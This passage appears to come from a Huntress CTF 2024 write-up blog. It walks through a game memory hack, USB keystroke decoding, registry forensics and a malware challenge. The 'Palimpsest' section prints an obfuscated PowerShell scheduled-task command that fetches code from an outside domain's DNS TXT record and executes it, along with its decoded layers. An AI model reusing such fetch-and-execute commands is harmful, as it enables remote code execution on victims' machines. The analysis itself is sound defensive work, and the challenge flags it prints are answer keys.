	srcset="/post/huntress-ctf-2024/Images/KnightsQuestFight5_hu9016343021691839343.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestFight5_hu15555676813253211618.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="505px"
	
></p>
<p>Unfortunately, a quick look at the final enemy and I see our &ldquo;infinite&rdquo; health is probably not enough:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestFight6.png"
	width="686"
	height="346"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestFight6_hu814942201562519137.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestFight6_hu10644103557183887302.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="475px"
	
></p>
<p>I may still instantly lose if the attack is more than my current hp, but also notable is that 999999999 health means i need to attack 100000000 times to win. So we need to edit the attack value. This value wasn&rsquo;t changing throughout the whole game, so we cannot do what was used for HP. Since it&rsquo;s very likely that all stat values are stored nearby, I look for the <code>10</code> value closest to our HP value:</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestCheat6.png"
	width="591"
	height="388"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestCheat6_hu13573535708254315156.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestCheat6_hu374681157746277351.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<p>For a simple program like this, it&rsquo;s probably fine to edit multiple addresses at the same time. Editing the wrong values can naturally cause a game crash, so I decided to only edit this value. It works!</p>
<p><img src="/post/huntress-ctf-2024/Images/KnightsQuestWin.png"
	width="681"
	height="308"
	srcset="/post/huntress-ctf-2024/Images/KnightsQuestWin_hu18256793901499113802.png 480w, /post/huntress-ctf-2024/Images/KnightsQuestWin_hu13867597570193420653.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="221"
		data-flex-basis="530px"
	
></p>
<p>Now we add the password to the curl command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$curl -X POST -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;password&#34;:&#34;hmafgAhAalqmQABBOAZtP3OWFegsQDAB&#34;}&#39; http://challenge.ctf.games:31045/submit  
</span></span><span class="line"><span class="cl">{&#34;flag&#34;:&#34;flag{40b5b7e5395ee921cbbc804d4350b9c1}&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 id="forensics">Forensics
</h2><h3 id="keyboard-junkie">Keyboard Junkie
</h3><blockquote>
<p>My friend wouldn&rsquo;t shut up about his new keyboard, so&hellip;</p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>This opens in <code>Wireshark</code>:</p>
<p><img src="/post/huntress-ctf-2024/Images/Keyboard_Junkie1.png"
	width="1332"
	height="470"
	srcset="/post/huntress-ctf-2024/Images/Keyboard_Junkie1_hu8919081490648468420.png 480w, /post/huntress-ctf-2024/Images/Keyboard_Junkie1_hu11423640960606694068.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="680px"
	
></p>
<p>It is recording USB communications. There are multiple objects, but we can see in Device Descriptor that <code>1.9.X</code> corresponds with a <code>KB212-B Quiet Key Keyboard</code>:</p>
<p><img src="/post/huntress-ctf-2024/Images/Keyboard_Junkie2.png"
	width="1000"
	height="808"
	srcset="/post/huntress-ctf-2024/Images/Keyboard_Junkie2_hu8549138163531624023.png 480w, /post/huntress-ctf-2024/Images/Keyboard_Junkie2_hu2606291719719306119.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="123"
		data-flex-basis="297px"
	
></p>
<p>Inspecting the data that is sourced from this device looks like we can see the individual keystrokes. Likely the situation is that the user typed out the flag, and the challenge is decoding the keystroke inputs back into the flag. When investigating the data each keystroke belongs to, I found <a class="link" href="https://blog.stayontarget.org/2019/03/decoding-mixed-case-usb-keystrokes-from.html"  target="_blank" rel="noopener"
    >this blog</a> that also gives a nice little decoder python script we can use! First is using <code>tshark</code> to isolate the data:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ tshark -r keyboard_junkie -T fields -e usb.capdata | tr -d : &gt; keystrokes.txt  
</span></span><span class="line"><span class="cl">** (tshark:888772) 14:00:47.199970 [Epan WARNING] /usr/src/debug/wireshark/wireshark-4.4.1/epan/value_string.c:471 -- _try_val_to_str_ext_init(): Extended value string &#39;usb_products_vals&#39; forced to fall back to linear search:  
</span></span><span class="line"><span class="cl"> entry 20704, value 645005387 [0x2672004b] &lt; previous entry, value 645005389 [0x2672004d]  
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">$ head keystrokes.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">800000
</span></span></code></pre></td></tr></table>
</div>
</div><p>There was a lot of empty space that messes up with this, but you can clear in vim with <code>:g/^$/d</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ head keystrokes.txt    
</span></span><span class="line"><span class="cl">800000  
</span></span><span class="line"><span class="cl">100000  
</span></span><span class="line"><span class="cl">0000160000000000  
</span></span><span class="line"><span class="cl">0000000000000000  
</span></span><span class="line"><span class="cl">0000120000000000  
</span></span><span class="line"><span class="cl">0000000000000000  
</span></span><span class="line"><span class="cl">00002c0000000000  
</span></span><span class="line"><span class="cl">0000000000000000  
</span></span><span class="line"><span class="cl">0000170000000000  
</span></span><span class="line"><span class="cl">0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first 2 lines have an apparently unusual format, but the python script works regardless:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python convertkeys.py keystrokes.txt    
</span></span><span class="line"><span class="cl">sospacethespaceanswerspaceisspaceflag{f7733e0093b7d281dd0a30fcf34a9634}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looks like the keystrokes were:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">so the answer is flag{f7733e0093b7d281dd0a30fcf34a9634}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="zimmer-down">Zimmer Down
</h3><blockquote>
<p>A user interacted with a suspicious file on one of our hosts.<br>
The only thing we managed to grab was the user&rsquo;s registry hive.<br>
Are they hiding any secrets?</p>
<p>Author: @sudo_Rem</p>
</blockquote>
<p>We are supplied <code>NTUSER.DAT</code> file, and the title is &ldquo;Zimmer&rdquo;, a very clear reference to the forensics toolkit <a class="link" href="https://ericzimmerman.github.io/#!index.md"  target="_blank" rel="noopener"
    >Eric Zimmerman&rsquo;s Tools</a>.</p>
<p>There is a particular relevant tool, the <code>Registry Explorer</code> that we can use to navigate the NTUSER file. With the file opened, navigating to the bookmarks:
<img src="/post/huntress-ctf-2024/Images/Zimmer_1.png"
	width="526"
	height="656"
	srcset="/post/huntress-ctf-2024/Images/Zimmer_1_hu5475308706725649838.png 480w, /post/huntress-ctf-2024/Images/Zimmer_1_hu2875114000783015235.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="80"
		data-flex-basis="192px"
	
></p>
<p>Under Recent Docs, we see interesting entries. In particular, an encoded filename:</p>
<p><img src="/post/huntress-ctf-2024/Images/Zimmer_2.png"
	width="796"
	height="417"
	srcset="/post/huntress-ctf-2024/Images/Zimmer_2_hu15083596738363498549.png 480w, /post/huntress-ctf-2024/Images/Zimmer_2_hu16457391840627093729.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="458px"
	
></p>
<p>The extension labels it as <code>Base 62</code>, and using CyberChef we can decode it into the flag:</p>
<p><img src="/post/huntress-ctf-2024/Images/Zimmer_3.png"
	width="741"
	height="323"
	srcset="/post/huntress-ctf-2024/Images/Zimmer_3_hu11468232277031519828.png 480w, /post/huntress-ctf-2024/Images/Zimmer_3_hu2053118519219356544.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="229"
		data-flex-basis="550px"
	
></p>
<p><code>flag{4b676ccc1070be66b1a15dB601c8d500}</code></p>
<hr>
<h2 id="malware">Malware
</h2><h3 id="palimpsest">Palimpsest
</h3><blockquote>
<p>Our IT department was setting up a new workstation and started encountering some strange errors while installing software.<br>
The technician noticed a strange scheduled task and luckily backed it up and grabbed some log files before wiping the machine!<br>
Can you figure out what&rsquo;s going on?<br>
<strong>We&rsquo;ve included the exported scheduled task and log files below.</strong><br>
The archive password is <code>infected-palimpsest</code>.</p>
<p>Author: Adam Rice (@adam.huntress)</p>
</blockquote>
<p>We get an event log <code>.evtx</code> file for some reason, and the malicious file. It is an <code>xml</code> file, and in the Actions, we can see a small powershell command that runs output from an external website:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;...SNIP...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Exec&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Command&gt;</span>powershell.exe<span class="nt">&lt;/Command&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Arguments&gt;</span>-ExecutionPolicy Bypass -Command &#34;Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName 5aa456e4dbed10b.pyrchdata.com -Type txt | Select-Object -ExpandPropertyStrings))))&#34;<span class="nt">&lt;/Arguments&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Exec&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Actions&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can run this in powershell. To avoid running potentially malicious code, we replace <code>Invoke-Expression</code> with <code>Write-Host</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Users\Kevin &gt; Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName 5aa456e4dbed10b.pyrchdata.com -Type txt | Select-Object -ExpandProperty Strings))))
</span></span><span class="line"><span class="cl">.( $SHElliD[1]+$SHElLid[13]+&#39;X&#39;)( neW-oBJECT Io.ComPreSsION.dEflATeStReAm([sySTem.IO.mEMORYsTREAM][sYstEM.cOnveRT]::FROmBAsE64strinG( &#39;ZVbLatxQDP0VLVpmJtwJ9217mT5oCyWB0l0IJaVZJJAWsiiBtv9e6Ui69rQLG19L1uPoSPL5fv/u7vPx5+3T/cXXj29pd/b47elsdzi/vH28uy4hpZBvjg9X9993u8N+f/36/cXT9c0N7SnlRCHFhQKlOPM9x9CmQDXKi8iy3MLSWSBXTXyFVFitUhCVNLHGRKHMQb8vmS8+JLZbsghgH8/QTImf2gLDKbN262wni5gN6xu54DuLi0JDocmnJBp8mqCQUoe8ScDZzCaJhD33iJBcYekiR65Ns5bQSG56ShDKPcUJejWYVNXEB7kTJNfLxgXBh0UjRw3FvpxD5ngUXvEAjJFdlBrBYZ4UPwdTXBCCw0GBFYGCCUeCKBmkBNAqy5rGlIErnZjXanuxPEAr0X9G+aE2rVNLoksG/FqYWdXIigGHeFEl2tYpWAG7gwwkUqhsQ0pNrUJRYRBaZUhABtbjcNikOOwxiNFWyGupItR6I7ECBWEqDDjYbIA6qoJTkuzwEMRcni1oMVeMT4JFQZSFlJ6V8ZJCml/Lsyh2jBrLxU+bkS/LBeUqpGuOgtyUsOy1G0ywIxlJ2LXoS4FdBIwKAZJ51Eje8auGIi4GzxwU8aZIgilKqiUMSjmPRKC9r+0qoqiZT25DqWBdJLVnlKpzzdqWAApj0/MoBQ0OahsrN1sY7a4sacoFWjlCq+NUlQcVMHMmPTujND+lNXkii7UNUlxzYrpLsqopwEk+Gg9K0yV8pWQPRgCpovPacmSG1mm0lVtYaMt/Aak4PZd5TIYyO2NtPnEXzDYYnchILgYrOEgoGCIsb3f/OmtGqWmFc9T+BLercwmnPCuJqETFjsmutbF4rNKkEPFTKR4U+jIq9DUZGRIGHwsaIKGebTsgQo+kTZCWyd6X4gyK7mZ2cFZMSlQqqmAZbFAVkDebQvLopRfXTBcFTvOKju/qQSJfDViLjBW29sRCow9AmM3OyjZr1slWfNoCq8F6nYcNk59BoTHxZOA1lWKQJxvFRZsv6SzB8knlNAMZRroDED8WwUS2SRedZSQjZcFMItu7Y0+CcjH/C6wDowGf7HbaLnfbmpt20hnpO8hzGsvMoST/evYNNiI4xbcuTrq+dtbYNrIlvNvWwQJQtl24gs52ik1OA922TKfD75f0i/BDJL9DL77Q8dXz1addfG5vdoc/dDg+/PhwyX9NfwE=&#39; ) ,[Io.coMPREssIon.COMPreSSiONMoDE]::dEcompRESs)| forEacH-obJECT {neW-oBJECT sysTEm.IO.STREAMREaDeR( $_ , [TExT.encoDiNG]::asCii ) }| foreACH-OBjECT {$_.REAdToEnd() } )
</span></span></code></pre></td></tr></table>
</div>
</div><p>There&rsquo;s more execution. There is base64 string, but at the end we can see compression/decompression is involved. We could potentially decode with CyberChef, or we can use <code>Write-Host</code> again:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Write</span><span class="o">-</span><span class="n">Host</span> <span class="p">(</span> <span class="o">$</span><span class="n">SHElliD</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">ieX</span> <span class="o">.</span><span class="p">((</span><span class="n">GeT</span><span class="o">-</span><span class="n">variAbLE</span> <span class="s1">&#39;*mdr*&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">Name</span><span class="p">[</span><span class="mi">3</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">2</span><span class="p">]</span><span class="o">-</span><span class="n">jOin</span><span class="s1">&#39;&#39;</span><span class="p">)(([</span><span class="n">CHAr</span><span class="p">[]]</span> <span class="p">(</span> <span class="mi">121</span> <span class="p">,</span><span class="mi">109</span> <span class="p">,</span> <span class="mi">108</span> <span class="p">,</span> <span class="mi">20</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">100</span> <span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">96</span> <span class="p">,</span> <span class="mi">6</span> <span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span> <span class="mi">24</span>  
</span></span><span class="line"><span class="cl"><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span><span class="mi">127</span> <span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">108</span> <span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span><span class="mi">111</span> <span class="p">,</span><span class="mi">32</span> <span class="p">,</span><span class="mi">38</span> <span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">32</span> <span class="p">,</span><span class="mi">127</span> <span class="p">,</span><span class="mi">112</span> <span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">122</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">122</span> <span class="p">,</span><span class="mi">113</span><span class="p">,</span><span class="mi">122</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span> <span class="p">,</span><span class="mi">122</span><span class="p">,</span> <span class="mi">113</span> <span class="p">,</span> <span class="mi">122</span> <span class="p">,</span><span class="mi">115</span> <span class="p">,</span>  
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="mi">13</span> <span class="p">,</span> <span class="mi">122</span> <span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">122</span> <span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">113</span> <span class="p">,</span><span class="mi">122</span> <span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">122</span> <span class="p">,</span> <span class="mi">116</span> <span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">20</span> <span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">54</span> <span class="p">,</span><span class="mi">56</span> <span class="p">,</span><span class="mi">117</span> <span class="p">,</span><span class="mi">116</span> <span class="p">)</span><span class="o">|%</span> <span class="p">{</span> <span class="p">[</span><span class="n">CHAr</span><span class="p">]</span> <span class="p">(</span> <span class="o">$</span><span class="n">_</span> <span class="o">-</span><span class="n">BxOR</span><span class="s1">&#39;0x5D&#39;</span><span class="p">)}</span> <span class="p">)</span><span class="o">-</span>  
</span></span><span class="line"><span class="cl"><span class="n">joIN</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is yet another more obfuscation. For the third time, we can use <code>Write-Host</code> to deobfuscate:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">iex</span><span class="w"> </span><span class="err">$</span><span class="mi">01</span><span class="n">Idu9</span><span class="w"> </span><span class="o">=</span><span class="p">[</span><span class="n">tYPE</span><span class="p">](</span><span class="s2">&#34;{1}{2}{0}&#34;</span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;io&#39;</span><span class="p">,</span><span class="s1">&#39;.fiL&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="err">${</span><span class="n">a</span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">40000</span><span class="p">..</span><span class="mi">65000</span><span class="p">;</span><span class="w"> </span><span class="err">${</span><span class="n">b</span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="mi">01</span><span class="n">Idu9</span><span class="p">::(</span><span class="s2">&#34;{1}{0}{2}&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="s1">&#39;ri&#39;</span><span class="p">,(</span><span class="s2">&#34;{1}{0}  
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="s1">&#39;penW&#39;</span><span class="p">,</span><span class="s1">&#39;O&#39;</span><span class="p">),</span><span class="s1">&#39;te&#39;</span><span class="p">).</span><span class="nf">Invoke</span><span class="p">((</span><span class="k">Join</span><span class="o">-</span><span class="n">Path</span><span class="w"> </span><span class="o">-</span><span class="n">Path</span><span class="w"> </span><span class="err">${</span><span class="n">EnV</span><span class="p">:</span><span class="n">a</span><span class="o">`</span><span class="n">P</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="n">DAta</span><span class="err">}</span><span class="w"> </span><span class="o">-</span><span class="n">ChildPath</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">mp4</span><span class="p">));</span><span class="w"> </span><span class="n">Get</span><span class="o">-</span><span class="n">EventLog</span><span class="w"> </span><span class="o">-</span><span class="nf">LogName</span><span class="w"> </span><span class="p">(</span><span class="s2">&#34;{0}{2}{1}  
</span></span></span><span class="line"><span class="cl"><span class="s2">{3}&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="s1">&#39;Ap&#39;</span><span class="p">,</span><span class="s1">&#39;licati&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="nf">Source</span><span class="w"> </span><span class="p">(</span><span class="s2">&#34;{0}{2}{1}&#34;</span><span class="o">-</span><span class="n">f</span><span class="s1">&#39;mslnstal&#39;</span><span class="p">,</span><span class="s1">&#39;er&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="err">${</span><span class="n">A</span><span class="err">}</span><span class="w"> </span><span class="o">-</span><span class="n">contains</span><span class="w"> </span><span class="err">${</span><span class="n">_</span><span class="err">}</span><span class="p">.</span><span class="s2">&#34;In`st`AnCe`iD&#34;</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">|</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sort</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="k">Index</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="err">${</span><span class="n">C</span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">${</span><span class="n">_</span><span class="err">}</span><span class="p">.</span><span class="s2">&#34;d`ATa&#34;</span><span class="p">;</span><span class="w"> </span><span class="err">${</span><span class="n">b</span><span class="err">}</span><span class="p">.(</span><span class="s2">&#34;{1}{0}&#34;</span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="s1">&#39;ite&#39;</span><span class="p">,</span><span class="s1">&#39;Wr&#39;</span><span class="p">).</span><span class="nf">Invoke</span><span class="p">(</span><span class="err">${</span><span class="n">C</span><span class="err">}</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="err">${</span><span class="n">C</span><span class="err">}</span><span class="p">.</span><span class="s2">&#34;LeN`GTh&#34;</span><span class="p">)</span><span class="w"> </span><span class="err">}</span><span class="p">;</span><span class="w"> </span><span class="err">${</span><span class="n">b</span><span class="err">}</span><span class="p">.(</span><span class="s2">&#34;{1}  
</span></span></span><span class="line"><span class="cl"><span class="s2">{0}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="w"> </span><span class="p">(</span><span class="s2">&#34;{0}{1}&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="s1">&#39;los&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">),</span><span class="s1">&#39;C&#39;</span><span class="p">).</span><span class="nf">Invoke</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>While it is still rather obfuscated, there are Invoke actions here so the write-host method will not work so well. Fortunately, we can pretty easily convert some of the obfuscations just by reading. For example, <code>(&quot;{0}{2}{1}&quot;-f'mslnstal','er','l')</code> describes a read order &ldquo;1st, 3rd, 2nd&rdquo;: <code>mslnstaller</code>. I sent this to ChatGPT to improve the readability, and it turned out quite well:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Define the file type
</span></span><span class="line"><span class="cl">$fileType = [Type]io.file
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Define the range of Instance IDs
</span></span><span class="line"><span class="cl">$instanceIds = 40000..65000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Open a file for writing
</span></span><span class="line"><span class="cl">$fileStream = $fileType::OpenWrite.Invoke((Join-Path -Path $Env:AppData -ChildPath &#39;flag.mp4&#39;))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Get application event log entries from the source &#39;mslnstaller&#39;
</span></span><span class="line"><span class="cl">Get-EventLog -LogName Application -Source mslnstaller |
</span></span><span class="line"><span class="cl">    Where-Object { $instanceIds -contains $_.InstanceID } |  # Filter by Instance ID
</span></span><span class="line"><span class="cl">    Sort-Object Index |  # Sort by Index
</span></span><span class="line"><span class="cl">    ForEach-Object { 
</span></span><span class="line"><span class="cl">        $fileStream.Write.Invoke($_.Data, 0, $_.Data.Length)  # Write data to the file
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Close the file stream
</span></span><span class="line"><span class="cl">$fileStream.Close.Invoke()
</span></span></code></pre></td></tr></table>
</div>
</div><p>There are even comments describing the behavior. In essence, a flag.mp4 file has been written to the <code>Application</code> event log over Event ID&rsquo;s 40000 - 65000. So to extract this data, we must separate the events. In the event viewer, we can sort by Event IDs, and select all events from the highest (64578) to the last 40000 event:</p>
<p><img src="/post/huntress-ctf-2024/Images/Palimpsest_1.png"
	width="1099"
	height="568"
	srcset="/post/huntress-ctf-2024/Images/Palimpsest_1_hu5563962457959656219.png 480w, /post/huntress-ctf-2024/Images/Palimpsest_1_hu13293981828345718915.png 1024w"
	loading="lazy"
	
		alt="We can highlight and Save Selected Events"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<p>By saving as <code>.xml</code>, the event data will be in plaintext. I found this out the hard way, but after cross-checking <a class="link" href="https://en.wikipedia.org/wiki/List_of_file_signatures"  target="_blank" rel="noopener"
    >magic byte values for .mp4</a>, you can find out that the correct order should be highest Event ID value first, in descending order. As for isolating the binary data, I opted for <code>CyberChef</code> replace functions. First, remove the beginning xml information manually:</p>
<p><img src="/post/huntress-ctf-2024/Images/Palimpsest_2.png"
	width="995"
	height="523"
	srcset="/post/huntress-ctf-2024/Images/Palimpsest_2_hu18131299559274834554.png 480w, /post/huntress-ctf-2024/Images/Palimpsest_2_hu4712425252207433965.png 1024w"
	loading="lazy"
	
		alt="Input of the file in CyberChef, with the initial xml removed. Boxed hex values correlate with the .mp4 magic bytes, by the way."
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
<p>Next, a regex to remove the xml format between binary sections:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;/Binary&gt;.{1,750}&lt;Binary&gt;
</span></span></code></pre></td></tr></table>
</div>
